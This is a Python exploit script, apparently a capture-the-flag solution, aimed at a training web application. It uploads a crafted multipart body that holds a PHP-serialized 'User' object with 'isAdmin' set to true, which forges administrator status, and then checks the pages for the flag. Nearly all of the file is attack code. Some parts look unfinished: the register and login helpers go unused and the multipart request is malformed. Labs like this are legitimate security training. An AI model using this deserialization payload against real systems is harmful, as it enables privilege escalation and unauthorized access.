import requests
import random
import string
import threading
import time

baseurl = "http://meta.training.jinblack.it"

def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def register(session,username, password):
    
    url = "%s/register.php" % baseurl
    data = {"username": username, "password_1": password, "password_2": password, "reg_user": "" }
    r = session.post(url, data=data)
    return r.text

def login(session, username, password):
    url = "%s/login.php" % baseurl
    data = {"username": username, "password": password, "log_user":""}
    r = session.post(url, data=data)
    url = "%s/index.php" % baseurl
    r = session.get(url)
    if "flag" in r.text:
        print(r.text)
    return r.text

def home(session, username, password):
    url = "%s/index.php" % baseurl
    r = session.get(url)
    if "flag" in r.text:
        print(r.text)
    return r.text

def upload(session):
     url = "%s/upload_user.php" % baseurl
     data = """
                -----------------------------110338796338443979054112016627
        Content-Disposition: form-data; name="user_bak"; filename="flag.txt"
        Content-Type: application/octet-stream

        O:4:"User":5:{s:4:"name";s:1:"k";s:2:"id";i:147517;s:7:"isAdmin";b:1;s:6:"solved";a:0:{}s:6:"points";i:0;}
        -----------------------------110338796338443979054112016627--
        """
     print(data)
     data = bytes(data, "utf-8")
     r = session.post(url, data=data)
     print(r.text)
     if "flag" in r.text:
         print("AAAAAAAAAAAAAAAAAAAAAAAAAA")


while True:
    s = requests.Session()
    u = randomString()
    p = randomString()

    upload(s)
    home(s,u,p)

    time.sleep(0.1)
    break